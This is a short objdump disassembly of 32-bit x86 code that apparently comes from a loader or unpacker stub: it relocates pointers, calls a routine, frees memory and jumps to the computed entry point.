  41e7a2:	8b f8                	mov    %eax,%edi
  41e7a4:	50                   	push   %eax
  41e7a5:	52                   	push   %edx
  41e7a6:	8b 33                	mov    (%ebx),%esi
  41e7a8:	8b 43 20             	mov    0x20(%ebx),%eax
  41e7ab:	03 c2                	add    %edx,%eax
  41e7ad:	8b 08                	mov    (%eax),%ecx
  41e7af:	89 4b 20             	mov    %ecx,0x20(%ebx)
  41e7b2:	8b 43 1c             	mov    0x1c(%ebx),%eax
  41e7b5:	03 c2                	add    %edx,%eax
  41e7b7:	8b 08                	mov    (%eax),%ecx
  41e7b9:	89 4b 1c             	mov    %ecx,0x1c(%ebx)
  41e7bc:	03 f2                	add    %edx,%esi
  41e7be:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  41e7c1:	03 ca                	add    %edx,%ecx
  41e7c3:	8d 43 1c             	lea    0x1c(%ebx),%eax
  41e7c6:	50                   	push   %eax
  41e7c7:	57                   	push   %edi
  41e7c8:	56                   	push   %esi
  41e7c9:	ff d1                	call   *%ecx
  41e7cb:	5a                   	pop    %edx
  41e7cc:	58                   	pop    %eax
  41e7cd:	03 43 08             	add    0x8(%ebx),%eax
  41e7d0:	8b f8                	mov    %eax,%edi
  41e7d2:	52                   	push   %edx
  41e7d3:	8b f0                	mov    %eax,%esi
  41e7d5:	8b 46 fc             	mov    -0x4(%esi),%eax
  41e7d8:	83 c0 04             	add    $0x4,%eax
  41e7db:	2b f0                	sub    %eax,%esi
  41e7dd:	89 56 08             	mov    %edx,0x8(%esi)
  41e7e0:	8b 4b 10             	mov    0x10(%ebx),%ecx
  41e7e3:	89 4e 24             	mov    %ecx,0x24(%esi)
  41e7e6:	8b 4b 14             	mov    0x14(%ebx),%ecx
  41e7e9:	51                   	push   %ecx
  41e7ea:	89 4e 28             	mov    %ecx,0x28(%esi)
  41e7ed:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  41e7f0:	89 4e 14             	mov    %ecx,0x14(%esi)
  41e7f3:	ff d7                	call   *%edi
  41e7f5:	89 85 c8 12 00 10    	mov    %eax,0x100012c8(%ebp)
  41e7fb:	8b f0                	mov    %eax,%esi
  41e7fd:	59                   	pop    %ecx
  41e7fe:	5a                   	pop    %edx
  41e7ff:	eb 0c                	jmp    0x41e80d
  41e801:	03 ca                	add    %edx,%ecx
  41e803:	68 00 80 00 00       	push   $0x8000
  41e808:	6a 00                	push   $0x0
  41e80a:	57                   	push   %edi
  41e80b:	ff 11                	call   *(%ecx)
  41e80d:	8b c6                	mov    %esi,%eax
  41e80f:	5a                   	pop    %edx
  41e810:	5e                   	pop    %esi
  41e811:	5f                   	pop    %edi
  41e812:	59                   	pop    %ecx
  41e813:	5b                   	pop    %ebx
  41e814:	5d                   	pop    %ebp
  41e815:	ff e0                	jmp    *%eax
	...
